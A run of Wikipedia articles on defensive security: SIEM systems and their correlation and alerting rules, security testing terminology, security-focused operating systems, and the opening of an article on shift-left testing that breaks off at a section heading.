Security information management (SIM): Long-term storage as well as analysis and reporting of log data.[24]
Security event manager (SEM): Real-time monitoring, correlation of events, notifications and console views.
Security information and event management (SIEM): Combines SIM and SEM and provides real-time analysis of security alerts generated by network hardware and applications.[1][25]
Managed Security Service: (MSS) or Managed Security Service Provider: (MSSP): The most common managed services appear to evolve around connectivity and bandwidth, network monitoring, security, virtualization, and disaster recovery.
Security as a service (SECaaS): These security services often include authentication, anti-virus, anti-malware/spyware, intrusion detection, penetration testing and security event management, among others.
In practice many products in this area will have a mix of these functions, so there will often be some overlap – and many commercial vendors also promote their own terminology.[26] Oftentimes commercial vendors provide different combinations of these functionalities which tend to improve SIEM overall. Log management alone doesn't provide real-time insights on network security, SEM on its own won't provide complete data for deep threat analysis. When SEM and log management are combined, more information is available for SIEM to monitor.
A key focus is to monitor and help manage user and service privileges, directory services and other[clarification needed] system-configuration changes; as well as providing log auditing and review and incident response.[24]

Capabilities[edit]
Data aggregation: Log management aggregates data from many sources, including networks, security, servers, databases, applications, providing the ability to consolidate monitored data to help avoid missing crucial events.
Correlation: Looks for common attributes and links events together into meaningful bundles. This technology provides the ability to perform a variety of correlation techniques to integrate different sources, in order to turn data into useful information. Correlation is typically a function of the Security Event Management portion of a full SIEM solution[27]
Alerting: The automated analysis of correlated events
Dashboards: Tools can take event data and turn it into informational charts to assist in seeing patterns, or identifying activity that is not forming a standard pattern.
Compliance: Applications can be employed to automate the gathering of compliance data, producing reports that adapt to existing security, governance and auditing processes.[28]
Retention: Employing long-term storage of historical data to facilitate correlation of data over time, and to provide the retention necessary for compliance requirements. The Long term log data retention is critical in forensic investigations as it is unlikely that the discovery of a network breach will be at the time of the breach occurring.[29]
Forensic analysis: The ability to search across logs on different nodes and time periods based on specific criteria. This mitigates having to aggregate log information in your head or having to search through thousands and thousands of logs.[28]
Components[edit]
 Basic SIEM Infrastructure
SIEM architectures may vary by vendor; however, generally, essential components comprise the SIEM engine. The essential components of a SIEM are as follows:[30]

A data collector forwards selected audit logs from a host (agent based or host based log streaming into index and aggregation point) [31][32]
An ingest and indexing point aggregation point for parsing, correlation, and data normalization [33]
A search node that is used for visualization, queries, reports, and alerts (analysis take place on a search node) [34]
A basic SIEM infrastructure is depicted in the image to the right.

Use cases[edit]
Computer security researcher Chris Kubecka identified the following SIEM use cases, presented at the hacking conference 28C3 (Chaos Communication Congress).[35]

SIEM visibility and anomaly detection could help detect zero-days or polymorphic code. Primarily due to low rates of anti-virus detection against this type of rapidly changing malware.
Parsing, log normalization and categorization can occur automatically, regardless of the type of computer or network device, as long as it can send a log.
Visualization with a SIEM using security events and log failures can aid in pattern detection.
Protocol anomalies that can indicate a misconfiguration or a security issue can be identified with a SIEM using pattern detection, alerting, baseline and dashboards.
SIEMS can detect covert, malicious communications and encrypted channels.
Cyberwarfare can be detected by SIEMs with accuracy, discovering both attackers and victims.
Correlation rules examples[edit]
SIEM systems can have hundreds and thousands of correlation rules. Some of these are simple, and some are more complex. Once a correlation rule is triggered the system can take appropriate steps to mitigate a cyber attack. Usually, this includes sending a notification to a user and then possibly limiting or even shutting down the system. According to UTMStack, these are some of the most important ones.

Brute Force Detection[edit]
Brute force detection is relatively straightforward. Brute forcing relates to continually trying to guess a variable. It most commonly refers to someone trying to constantly guess your password - either manually or with a tool. However, it can refer to trying to guess URLs or important file locations on your system.
An automated brute force is easy to detect as someone trying to enter their password 60 times in a minute is impossible.

Impossible Travel[edit]
When a user logs in to a system, generally speaking, it creates a timestamp of the event. Alongside the time, the system may often record other useful information such as the device used, physical location, IP address, incorrect login attempts, etc. The more data is collected the more use can be gathered from it. For impossible travel, the system looks at the current and last login date/time and the difference between the recorded distances. If it deems it's not possible for this to happen, for example traveling hundreds of miles within a minute, then it will set off a warning.
Many employees and users are now using VPN services which may obscure physical location. This should be taken into consideration when setting up such a rule.

Excessive File Copying[edit]
If you think about your day-to-day activities, you most likely don't copy or move a lot of files around on your system. Therefore any excessive file copying on a system could be attributed to someone wanting to cause harm to your company. Unfortunately, it's not as simple as stating someone has gained access to your network illegally and wants to steal confidential information. It could also be an employee looking to sell company information, or they could just want to take home some files for the weekend.

DDoS Attack[edit]
A DDoS (Distributed Denial of Service) Attack would cause an issue for pretty much any company. A DDoS attack can not only take your web properties offline, it can also make your system weaker. With suitable correlation rules in place, your SIEM should trigger an alert right at the start of the attack so that you can take the necessary precautionary measures to protect your systems.

File Integrity Change[edit]
File Integrity and Change Monitoring (FIM) is the process of monitoring the files on your system. Unexpected changes in your system files will trigger an alert as it's a likely indication of a cyber attack.

Models[edit]
Alongside correlation rules, it's also possible for SIEM to have models. Models differ somewhat from correlation rules but if implemented correctly can be just as useful.  Instead of using a one-to-one correlation, a model requires a number of steps to happen in order to trigger an alert. This usually means a first-time rule followed by an anomalous behavior. This can be as simple as a user logging in from a different location than usual and then carrying out a large file transfer.
This can be extremely useful as a single event does not necessarily mean a compromise of an organization's servers or network, it could just be a team member working from a café for a change in scenery.

Handling False Positives[edit]
Unfortunately, false positives appear in all walks of life, and this holds true for SIEM.  All tools and systems have the possibility to produce a false-positive result. For example, too many failed login attempts can just be an employee forgetting their password and not someone trying to break into the system. It's important that for any triggered events the steps taken are justifiable and of an appropriate measure as you wouldn't want employees getting locked out for hours in such scenarios.[36]

Alerting examples[edit]
Some examples of customized rules to alert on event conditions involve user authentication rules, attacks detected and infections detected.[37]



Rule
Goal
Trigger
Event Sources


Repeat Attack-Login Source
Early warning for brute force attacks, password guessing, and misconfigured applications.
Alert on 3 or more failed logins in 1 minute from a single host.
Active Directory, Syslog (Unix Hosts, Switches, Routers, VPN), RADIUS, TACACS, Monitored Applications.


Repeat Attack-Firewall
Early warning for scans, worm propagation, etc.
Alert on 15 or more Firewall Drop/Reject/Deny Events from a single IP Address in one minute.

Firewalls, Routers and Switches.


Repeat Attack-Network Intrusion Prevention System
Early warning for scans, worm propagation, etc.
Alert on 7 or more IDS Alerts from a single IP Address in one minute
Network Intrusion Detection and Prevention Devices


Repeat Attack-Host Intrusion Prevention System
Find hosts that may be infected or compromised(exhibiting infection behaviors)
Alert on 3 or more events from a single IP Address in 10 minutes
Host Intrusion Prevention System Alerts


Virus Detection/Removal
Alert when a virus, spyware or other malware is detected on a host
Alert when a single host sees an identifiable piece of malware
Anti-Virus, HIPS, Network/System Behavioral Anomaly Detectors


Virus or Spyware Detected but Failed to Clean
Alert when >1 Hour has passed since malware was detected, on a source, with no corresponding virus successfully removed
Alert when a single host fails to auto-clean malware within 1 hour of detection
Firewall, NIPS, Anti-Virus, HIPS, Failed Login Events

See also[edit]
IT risk
Log management
Security event manager
Security information management
References[edit]


^ a b "SIEM: A Market Snapshot". Dr.Dobb's Journal. 5 February 2007.

^ 
Williams, Amrit (2005-05-02). "Improve IT Security With Vulnerability Management". Retrieved 2016-04-09. Security information and event management (SIEM)

^ Ruthberg, Zella; McKenzie, Robert (1977-10-01). "Audit and Evaluation of Computer Security". doi:10.6028/NBS.SP.500-19. {{cite journal}}: Cite journal requires |journal= (help)

^ Johnson, Arnold; Dempsey, Kelley; Ross, Ron; Gupta, Sarbari; Bailey, Dennis (October 2019). "Guide for security-focused configuration management of information systems" (PDF). Gaithersburg, MD: NIST SP 800–128. doi:10.6028/nist.sp.800-128. S2CID 63907907. {{cite journal}}: Cite journal requires |journal= (help)

^ "Improving the Nation's Cybersecurity". Federal Register. 2021-05-17. Retrieved 2021-07-28.

^ Kent, Karen; Souppaya, Murugiah (2006-09-13). "Guide to Computer Security Log Management". doi:10.6028/NIST.SP.800-92. S2CID 221183642. {{cite journal}}: Cite journal requires |journal= (help)

^ a b c Computer Security Division, Information Technology Laboratory (2016-11-30). "Release Search - NIST Risk Management Framework | CSRC | CSRC". CSRC | NIST. Retrieved 2021-06-13.

^ Computer Security Division, Information Technology Laboratory (2016-11-30). "NIST Risk Management Framework | CSRC | CSRC". CSRC | NIST. Retrieved 2021-07-23.

^ "Understanding the NIST cybersecurity framework". Federal Trade Commission. 2018-10-05. Retrieved 2021-07-23.

^ Rights (OCR), Office for Civil (2009-11-20). "Summary of the HIPAA Security Rule". HHS.gov. Retrieved 2021-07-23.

^ "The Role of Information Security in Sarbanes-Oxley Compliance". Issues in Information Systems. 2005. doi:10.48009/2_iis_2005_124-130. ISSN 1529-7314.

^ "Mapping PCI DSS v3_2_1 to the NIST Cybersecurity Framework v1_1" (PDF). July 2019.{{cite web}}:  CS1 maint: url-status (link)

^ "NIST SP 800-53, Revision 5 Control Mappings to ISO/IEC 27001". 10 December 2020.{{cite web}}:  CS1 maint: url-status (link)

^ a b Computer Security Division, Information Technology Laboratory (2016-11-30). "Release Search - NIST Risk Management Framework | CSRC | CSRC". CSRC | NIST. Retrieved 2021-07-18.

^ "Risk management framework for information systems and organizations". Gaithersburg, MD. December 2018. doi:10.6028/nist.sp.800-37r2. {{cite journal}}: Cite journal requires |journal= (help)

^ "Guide for conducting risk assessments". Gaithersburg, MD. 2012. doi:10.6028/nist.sp.800-30r1. {{cite journal}}: Cite journal requires |journal= (help)

^ "Improving the Nation's Cybersecurity". Federal Register. 2021-05-17. Retrieved 2021-07-18.

^ a b c Computer Security Division, Information Technology Laboratory (2016-11-30). "Release Search - NIST Risk Management Framework | CSRC | CSRC". CSRC | NIST. Retrieved 2021-07-19.

^ "Security and Privacy Controls for Information Systems and Organizations". 2020-09-23. doi:10.6028/nist.sp.800-53r5. S2CID 238185691. {{cite journal}}: Cite journal requires |journal= (help)

^ Mavroeidis, Vasileios; Jøsang, Audun (2018-03-16). "Data-Driven Threat Hunting Using Sysmon". Proceedings of the 2nd International Conference on Cryptography, Security and Privacy. ICCSP 2018. Guiyang, China: Association for Computing Machinery: 82–88. arXiv:2103.15194. doi:10.1145/3199478.3199490. ISBN 978-1-4503-6361-7. S2CID 49864578.

^ Force, Joint Task (2020-12-10). "Security and Privacy Controls for Information Systems and Organizations". doi:10.6028/NIST.SP.800-53r5. S2CID 238185691. {{cite journal}}: Cite journal requires |journal= (help)

^ Swift, David (26 December 2006). "A Practical Application of SIM/SEM/SIEM, Automating Threat Identification" (PDF). SANS Institute. p. 3. Retrieved 14 May 2014. ...the acronym SIEM will be used generically to refer...

^ Kent, Karen; Souppaya, Murugiah (September 2006). "Guide to Computer Security Log Management". Computer Security Resource Center, NIST. doi:10.6028/NIST.SP.800-92. S2CID 221183642. SP 800-92. {{cite journal}}: Cite journal requires |journal= (help)

^ a b Jamil, Amir (29 March 2010). "The difference between SEM, SIM and SIEM".

^ The Future of SIEM - The market will begin to diverge

^ Bhatt, S.; Manadhata, P.K.; Zomlot, L. (2014). "The Operational Role of Security Information and Event Management Systems". IEEE Security & Privacy. 12 (5): 35–41. doi:10.1109/MSP.2014.103. S2CID 16419710.

^ Correlation Archived 2014-10-19 at the Wayback Machine

^ a b "Compliance Management and Compliance Automation – How and How Efficient, Part 1". accelops.net. Archived from the original on 2011-07-23. Retrieved 2018-05-02.

^ "2018 Data Breach Investigations Report | Verizon Enterprise Solutions". Verizon Enterprise Solutions. Retrieved 2018-05-02.

^ Kotenko, Igor; Polubelova, Olga; Saenko, Igor (November 2012). "The Ontological Approach for SIEM Data Repository Implementation". 2012 IEEE International Conference on Green Computing and Communications. Besancon, France: IEEE: 761–766. doi:10.1109/GreenCom.2012.125. ISBN 978-1-4673-5146-1. S2CID 18920083.

^ Kotenko, Igor; Chechulin, Andrey (November 2012). "Common Framework for Attack Modeling and Security Evaluation in SIEM Systems". 2012 IEEE International Conference on Green Computing and Communications: 94–101. doi:10.1109/GreenCom.2012.24. ISBN 978-1-4673-5146-1. S2CID 15834187.

^ Karl-Bridge-Microsoft. "Eventlog Key - Win32 apps". docs.microsoft.com. Retrieved 2021-07-18.

^ Kotenko, Igor; Polubelova, Olga; Saenko, Igor (November 2012). "The Ontological Approach for SIEM Data Repository Implementation". 2012 IEEE International Conference on Green Computing and Communications: 761–766. doi:10.1109/GreenCom.2012.125. ISBN 978-1-4673-5146-1. S2CID 18920083.

^ Azodi, Amir; Jaeger, David; Cheng, Feng; Meinel, Christoph (December 2013). "Pushing the Limits in Event Normalisation to Improve Attack Detection in IDS/SIEM Systems". 2013 International Conference on Advanced Cloud and Big Data: 69–76. doi:10.1109/CBD.2013.27. ISBN 978-1-4799-3261-0. S2CID 1066886.

^ "28c3: Security Log Visualization with a Correlation Engine". YouTube. December 29, 2011. Archived from the original on 2021-12-15. Retrieved November 4, 2017.

^ "Essential SIEM Correlation Rules for Compliance". UTMStack. 17 November 2020.

^ Swift, David (2010). "Successful SIEM and Log Management Strategies for Audit and Compliance". SANS Institute.






Retrieved from "https://en.wikipedia.org/w/index.php?title=Security_information_and_event_management&oldid=1136138901"
Categories: Data securityHidden categories: CS1 errors: missing periodicalCS1 maint: url-statusWebarchive template wayback linksArticles with short descriptionShort description is different from WikidataWikipedia introduction cleanup from August 2021All pages needing cleanupArticles covered by WikiProject Wikify from August 2021All articles covered by WikiProject WikifyWikipedia articles needing clarification from March 2016
 



From Wikipedia, the free encyclopedia


The process of finding flaws in the security of information systems
This article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Security testing" – news · newspapers · books · scholar · JSTOR (August 2019) (Learn how and when to remove this template message)
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Security testing is a process intended to reveal flaws in the security mechanisms of an information system that protect data and maintain functionality as intended.[1] Due to the logical limitations of security testing, passing the security testing process is not an indication that no flaws exist or that the system adequately satisfies the security requirements.
Typical security requirements may include specific elements of confidentiality, integrity, authentication, availability, authorization and non-repudiation.[2] Actual security requirements tested depend on the security requirements implemented by the system. Security testing as a term has a number of different meanings and can be completed in a number of different ways. As such, a Security Taxonomy helps us to understand these different approaches and meanings by providing a base level to work from.


Confidentiality[edit]
A security measure which protects against the disclosure of information to parties other than the intended recipient is by no means the only way of ensuring the security. [3]
Integrity[edit]
Integrity of information refers to protecting information from being modified by unauthorized parties

A measure intended to allow the receiver to determine that the information provided by a system is correct.
Integrity schemes often use some of the same underlying technologies as confidentiality schemes, but they usually involve adding information to a communication, to form the basis of an algorithmic check, rather than the encoding all of the communication.
To check if the correct information is transferred from one application to other. [3]
Authentication[edit]
This might involve confirming the identity of a person, tracing the origins of an artifact, ensuring that a product is what its packaging and labelling claims to be, or assuring that a computer program is a trusted one. [3]

Authorization[edit]
The process of determining that a requester is allowed to receive a service or perform an operation.
Access control is an example of authorization.
Availability[edit]
Assuring information and communications services will be ready for use when expected.
Information must be kept available to authorized persons when they need it.
Non-repudiation[edit]
In reference to digital security, non-repudiation means to ensure that a transferred message has been sent and received by the parties claiming to have sent and received the message. Non-repudiation is a way to guarantee that the sender of a message cannot later deny having sent the message and that the recipient cannot deny having received the message.
A sender-id is usually a header transmitted along with message which recognises the message source.
Taxonomy[edit]
Common terms used for the delivery of security testing:

Discovery - The purpose of this stage is to identify systems within scope and the services in use. It is not intended to discover vulnerabilities, but version detection may highlight deprecated versions of software / firmware and thus indicate potential vulnerabilities.
Vulnerability Scan - Following the discovery stage this looks for known security issues by using automated tools to match conditions with known vulnerabilities. The reported risk level is set automatically by the tool with no manual verification or interpretation by the test vendor. This can be supplemented with credential based scanning that looks to remove some common false positives by using supplied credentials to authenticate with a service (such as local windows accounts).
Vulnerability Assessment - This uses discovery and vulnerability scanning to identify security vulnerabilities and places the findings into the context of the environment under test. An example would be removing common false positives from the report and deciding risk levels that should be applied to each report finding to improve business understanding and context.
Security Assessment - Builds upon Vulnerability Assessment by adding manual verification to confirm exposure, but does not include the exploitation of vulnerabilities to gain further access. Verification could be in the form of authorized access to a system to confirm system settings and involve examining logs, system responses, error messages, codes, etc. A Security Assessment is looking to gain a broad coverage of the systems under test but not the depth of exposure that a specific vulnerability could lead to.
Penetration Test - Penetration test simulates an attack by a malicious party. Building on the previous stages and involves exploitation of found vulnerabilities to gain further access. Using this approach will result in an understanding of the ability of an attacker to gain access to confidential information, affect data integrity or availability of a service and the respective impact. Each test is approached using a consistent and complete methodology in a way that allows the tester to use their problem solving abilities, the output from a range of tools and their own knowledge of networking and systems to find vulnerabilities that would/ could not be identified by automated tools. This approach looks at the depth of attack as compared to the Security Assessment approach that looks at the broader coverage.
Security Audit - Driven by an Audit / Risk function to look at a specific control or compliance issue. Characterized by a narrow scope, this type of engagement could make use of any of the earlier approaches discussed (vulnerability assessment, security assessment, penetration test).
Security Review - Verification that industry or internal security standards have been applied to system components or product. This is typically completed through gap analysis and utilizes build / code reviews or by reviewing design documents and architecture diagrams. This activity does not utilize any of the earlier approaches (Vulnerability Assessment, Security Assessment, Penetration Test, Security Audit)
Tools[edit]
Container and Infrastructure Security Analysis[4][5]
SAST - Static Application Security Testing
DAST - Dynamic Application Security Testing
IAST - Interactive Application Security Testing[6]
DLP - Data Loss Prevention
IDS, IPS - Intrusion Detection System, Intrusion Prevention System
OSS Scanning - Open Source Software Scanning (see Open-source software security)
RASP - Runtime Application Self-Protection
SCA - Software Composition Analysis[7]
WAF - Web Application Firewall
See also[edit]
National Information Assurance Glossary
References[edit]


^ M Martellini, & Malizia, A. (2017). Cyber and chemical, biological, radiological, nuclear, explosives challenges : threats and counter efforts. Springer.

^ "Introduction to Information Security" US-CERT https://www.us-cert.gov/security-publications/introduction-information-security

^ a b c A, Madhu (2017-12-04). "The Six Principles of Security Testing | Trigent Vantage". Retrieved 2022-08-28.

^ "Container Security Verification Standard". GitHub. 20 July 2022.

^ "Infrastructure as Code Security - OWASP Cheat Sheet Series".

^ "OWASP DevSecOps Guideline - v-0.2 | OWASP Foundation".

^ "Component Analysis | OWASP Foundation".


vteSoftware testingThe "box" approach
Black-box testing
All-pairs testing
Exploratory testing
Fuzz testing
Model-based testing
Scenario testing
Grey-box testing
White-box testing
API testing
Mutation testing
Static testing
Testing levels
Acceptance testing
Integration testing
System testing
Unit testing
Testing types, techniques,and tactics
A/B testing
Benchmark
Compatibility testing
Concolic testing
Concurrent testing
Conformance testing
Continuous testing
Destructive testing
Development testing
Dynamic program analysis
Installation testing
Regression testing
Security testing
Smoke testing (software)
Software performance testing
Symbolic execution
Test automation
Usability testing
See also
Graphical user interface testing
Manual testing
Orthogonal array testing
Pair testing
Soak testing
Software reliability testing
Stress testing
Web testing





Retrieved from "https://en.wikipedia.org/w/index.php?title=Security_testing&oldid=1107139545"
Categories: Computer securitySecurity testingHidden categories: Articles with short descriptionShort description is different from WikidataArticles needing additional references from August 2019All articles needing additional references
 



From Wikipedia, the free encyclopedia


Operating systems, that are focused on anonymous, privacy and security.


Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
This is a list of operating systems specifically focused on security. Operating systems for general-purpose usage may be secure without having a specific focus on security.[1]
Similar concepts include security-evaluated operating systems that have achieved certification from an auditing organization, and trusted operating systems that provide sufficient support for multilevel security and evidence of correctness to meet a particular set of requirements.


Linux[edit]
Android-based[edit]
Android in general is very secure, having many security features such as taking advantage of SELinux and Verified Boot.
CalyxOS is a free and open source privacy and security focused Android Custom ROM
DivestOS is a free and open source privacy and security focused Android Custom ROM
GrapheneOS is an open source privacy and security focused Android Custom ROM
Kali NetHunter is a free and open source Kali Linux based Android Custom ROM for penetration testing


Debian-based[edit]
Subgraph is a Linux-based operating system designed to be resistant to surveillance and interference by sophisticated adversaries over the Internet. Subgraph OS is designed with features that aim to reduce the attack surface of the operating system, and increase the difficulty required to carry out certain classes of attack. This is accomplished through system hardening and a proactive, ongoing focus on security and attack resistance. Subgraph OS also places emphasis on ensuring the integrity of installed software packages through deterministic compilation. Subgraph OS features a kernel hardened with the Grsecurity and PaX patchset, Linux namespaces, and Xpra for application containment, mandatory file system encryption using LUKS, resistance to cold boot attacks, and is configured by default to isolate network communications for installed applications to independent circuits on the Tor anonymity network.[citation needed]
Tails is a security-focused Linux distribution aimed at preserving privacy and anonymity. It is meant to be run as Live-CD or from a USB Drive and to not write any kind of data to a drive, unless specified or persistence is set. That way, it lives in RAM and everything is purged from the system whenever it is powered off. Tails is designed to do an emergency shutdown and erase its data from RAM if the medium where it resides is expelled.[2]
Whonix[3][4] is an anonymous general purpose operating system based on VirtualBox, Debian Linux and Tor. By Whonix design, IP and DNS leaks are impossible. Not even Malware as Superuser can find out the user's real IP address/location. This is because Whonix consists of two (virtual) machines. One machine solely runs Tor and acts as a gateway, called Whonix-Gateway. The other machine, called Whonix-Workstation, is on a completely isolated network. It is also possible to use multiple Whonix Workstations simultaneously through one Gateway, that will provide stream isolation (though is not necessarily endorsed).[5] All the connections are forced through Tor with the Whonix Gateway Virtual Machine, therefore IP and DNS leaks are impossible.[6]
Xen-based[edit]
Qubes OS is a desktop operating system based around the Xen hypervisor that allows grouping programs into a number of isolated sandboxes (virtual machines) to provide security. Windows for programs running within these sandboxes ("security domains") can be color coded for easy recognition. The security domains are configurable, they can be transient (changes to the file system will not be preserved), and their network connection can be routed through special virtual machines (for example one that only provides Tor networking). The operating system provides secure mechanisms for copy and paste and for copying files between the security domains[7]
Gentoo-based[edit]
Pentoo is a Live CD and Live USB designed for penetration testing and security assessment.[8][9][10][11] Based on Gentoo Linux, Pentoo is provided both as 32 and 64-bit installable live CD. It is built on Hardened Gentoo linux including a hardened kernel and a toolchain.
Tin Hat Linux is derived from Hardened Gentoo Linux. It aims to provide a very secure, stable, and fast desktop environment that lives purely in RAM.[12]
Other Linux distributions[edit]
Alpine Linux is an actively maintained lightweight musl and BusyBox-based distribution. It uses PaX and grsecurity patches in the default kernel and compiles all packages with stack-smashing protection.
Annvix was originally forked from Mandriva to provide a security-focused server distribution that employs ProPolice protection, hardened configuration, and a small footprint. There were plans to include full support for the RSBAC mandatory access control system. Annvix is dormant, however, with the last version being released on 30 December 2007.[13]
EnGarde Secure Linux is a secure platform designed for servers. It has had a browser-based tool for MAC using SELinux since 2003. Additionally, it can be accompanied with Web, DNS, and email enterprise applications, specifically focusing on security without any unnecessary software. The community platform of EnGarde Secure Linux is the bleeding-edge version freely available for download.[citation needed]
Immunix was a commercial distribution of Linux focused heavily on security. They supplied many systems of their own making, including StackGuard; cryptographic signing of executables; race condition patches; and format string exploit guarding code. Immunix traditionally releases older versions of their distribution free for non-commercial use. The Immunix distribution itself is licensed under two licenses: The Immunix commercial and non-commercial licenses. Many tools within are GPL, however, as is the kernel.[citation needed]
Solar Designer's Openwall Project (Owl) was the first distribution to have a non-executable userspace stack, /tmp race condition protection, and access control restrictions to /proc data, by way of a kernel patch. It also features a per-user tmp directory via the pam_mktemp PAM module, and supports Blowfish password encryption.
BSD-based[edit]
TrustedBSD is a sub-project of FreeBSD designed to add trusted operating system extensions, targeting the Common Criteria for Information Technology Security Evaluation (see also Orange Book). Its main focuses are working on access control lists, event auditing, extended attributes, mandatory access controls, and fine-grained capabilities. Since access control lists are known to be confronted with the confused deputy problem, capabilities are a different way to avoid this issue. As part of the TrustedBSD project, there is also a port of NSA's FLASK/TE implementation to run on FreeBSD. Many of these trusted extensions have been integrated into the main FreeBSD branch starting at 5.x.
OpenBSD is a research operating system for developing security mitigations.[14]
SELinux module[edit]
Security-Enhanced Linux (SELinux) is a module that may be incorporated into a Linux distribution.

Object-capability systems[edit]
This section needs expansion. You can help by adding to it.  (January 2018)
These operating systems are all engineered around the object-capabilities security paradigm. Instead of the system deciding if an access request should be granted, the bundling authority and designation decides.

CapROS
EROS
Genode
Fiasco.OC
KeyKOS
seL4
Solaris-based[edit]
Trusted Solaris was a security-focused version of the Solaris Unix operating system. Aimed primarily at the government computing sector, Trusted Solaris adds detailed auditing of all tasks, pluggable authentication, mandatory access control, additional physical authentication devices, and fine-grained access control. Trusted Solaris is Common Criteria certified.[15][16] The most recent version, Trusted Solaris 8 (released 2000), received the EAL4 certification level augmented by a number of protection profiles. Telnet was vulnerable to buffer overflow exploits until patched in April 2001.[17]
See also[edit]

Capabilities and access control lists
Comparison of operating systems
Damn Vulnerable Linux
IX (operating system)
OpenBSM
Operating system (section Security)
Security engineering
Security-evaluated operating system
Trusted operating system
References[edit]


^ "Mandatory Security - an overview | ScienceDirect Topics". www.sciencedirect.com. Retrieved 5 December 2021.

^ Vervloesem, Koen (27 April 2011). "The Amnesic Incognito Live System: A live CD for anonymity [LWN.net]". lwn.net. Archived from the original on 21 August 2017. Retrieved 14 June 2017.

^ "Whonix/Whonix". GitHub. Archived from the original on 25 November 2016. Retrieved 9 April 2018.

^ "Whonix: An OS for the era of Anonymous and Wikileaks". computerworld.com.au. Archived from the original on 7 November 2017. Retrieved 9 April 2018.

^ "Multiple Whonix-Workstation ™". www.whonix.org. Archived from the original on 1 October 2019. Retrieved 1 October 2019.

^ "Whonix: An Operating System Where IP & DNS Leaks Are Impossible".

^ Porup, J.M. (14 February 2022). "Qubes OS: A reasonably secure operating system". Qubes OS. Archived from the original on 14 February 2022.

^ Pentoo (Gentoo) Based Linux Review, Features and Screenshot Tour, TecMint.

^ KITE Introduces a New Secured FOSS Based Operating System

^ A Look at Pentoo Linux and Its Security Analysis Tools, eWeek

^ 12 Best Operating Systems For Ethical Hacking And Penetration Testing | 2018 Edition

^ "Tin Hat". D'Youville College. Archived from the original on 3 March 2016. Retrieved 4 September 2015.

^ "Annvix: A stable, secure, no-frills server distro". Linux.com | The source for Linux information. 16 January 2008. Archived from the original on 24 July 2018. Retrieved 24 July 2018.

^ "Pledge() - A New Mitigation Mechanism". Retrieved 8 October 2018.

^ "Sun Common Criteria Certification". 13 October 2004. Archived from the original on 13 October 2004. Retrieved 9 April 2018.

^ "CESG Information Assurance and Certification Services". sun.com (JPG). 30 March 2004. Archived from the original on 12 March 2007.

^ "Sun Patch: Trusted Solaris 8 4/01: in.telnet patch". 4 October 2002. Retrieved 13 August 2012. 4734086 in.telnetd vulnerable to buffer overflow ?? (Solaris bug 4483514)[permanent dead link]






Retrieved from "https://en.wikipedia.org/w/index.php?title=Security-focused_operating_system&oldid=1135544253"
Categories: Operating system securityHidden categories: All articles with dead external linksArticles with dead external links from July 2018Articles with permanently dead external linksArticles with short descriptionShort description matches WikidataUse dmy dates from July 2018All articles with unsourced statementsArticles with unsourced statements from October 2016Articles to be expanded from January 2018All articles to be expandedArticles using small message boxes
 



From Wikipedia, the free encyclopedia


Type of software testing
This article has multiple issues. Please help improve it or discuss these issues on the talk page. (Learn how and when to remove these template messages)

This article includes a list of general references, but it lacks sufficient corresponding inline citations. Please help to improve this article by introducing more precise citations. (May 2015) (Learn how and when to remove this template message)This article is written like a personal reflection, personal essay, or argumentative essay that states a Wikipedia editor's personal feelings or presents an original argument about a topic. Please help improve it by rewriting it in an encyclopedic style. (May 2015) (Learn how and when to remove this template message)

 (Learn how and when to remove this template message)
Shift-left testing[1] is an approach to software testing and system testing in which testing is performed earlier in the lifecycle (i.e. moved left on the project timeline). It is the first half of the maxim "test early and often".[2] It was coined by Larry Smith in 2001.[3][4]


Harm due to late testing[edit]
Shift-left testing aims to prevent the following types of harm due to late testing:

Insufficient resources allocated to testing.
Undiscovered defects in requirements, architecture, and design, along with significant effort wasted while implementing them.
Difficulty debugging (including identifying, localizing, fixing, and regression testing defects) as more software is produced and integrated.
Reduced code coverage during testing[citation needed] as a result of encapsulation impeding white-box testing.
A “bow wave” of technical debt that can cause a project to fail.
Types of shift-left testing[edit]
